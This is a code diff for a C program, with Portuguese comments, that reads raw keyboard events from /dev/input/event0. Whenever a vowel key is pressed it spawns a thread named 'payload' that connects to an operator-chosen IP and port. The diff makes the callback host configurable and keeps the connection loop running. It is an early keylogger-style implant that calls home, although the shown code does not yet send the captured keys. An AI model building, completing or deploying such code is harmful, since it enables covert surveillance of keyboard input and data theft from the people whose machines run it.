@@ -9,21 +9,26 @@
 #include <string.h>
 #include <stdlib.h>
 
+#define	INTERFACE_EVENT "/dev/input/event0"
+#define IP_SEND				"124.0.0.1"  // defina aqui o seu ip
+#define PORT			8523  // redireciona a porta para o servidor escutando
+#define TM_SLEEP		30000
+
 void	*ft_connect(void *arg)
 {
 	struct sockaddr_in		servtarg;
 	int						sockfd;
 
 	memset(&servtarg, 0, sizeof(servtarg));
-	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	servtarg.sin_family = AF_INET;
-	servtarg.sin_port = htons(8523);
-	inet_pton(AF_INET, "127.0.0.1", &servtarg.sin_addr);
+	servtarg.sin_port = htons(PORT);
+	inet_pton(AF_INET, IP_SEND, &servtarg.sin_addr);
 	if (connect(sockfd, (struct sockaddr *)&servtarg, sizeof(servtarg)) < 0)
 		perror("conexação recusada");
-	while (true);
+	while (true)
+		usleep(TM_SLEEP);
 	close(sockfd);
-	exit(EXIT_SUCCESS);
 	return (arg);
 }
 
@@ -33,7 +38,7 @@ int	main(void)
 	int					fd;
 	pthread_t			payload;
 
-	fd = open("/dev/input/event0", O_RDONLY);
+	fd = open(INTERFACE_EVENT, O_RDONLY);
 	if (fd < 0)
 	{
 		perror("Erro: leitura invalidad da interface input");
@@ -45,8 +50,11 @@ int	main(void)
 		{
 			if (key.code == KEY_A || key.code == KEY_E || key.code == KEY_I ||
 				key.code == KEY_O || key.code == KEY_U)
-				pthread_create(&payload, NULL, &ft_connect, NULL);
+				pthread_create(&payload, NULL, ft_connect, NULL);
+			printf("%s\n", "a execução continua depois de estabelecer a conexão"); 
 		}
 	}
+	pthread_join(payload, NULL);
+	close(fd);
 	return (0);
 }
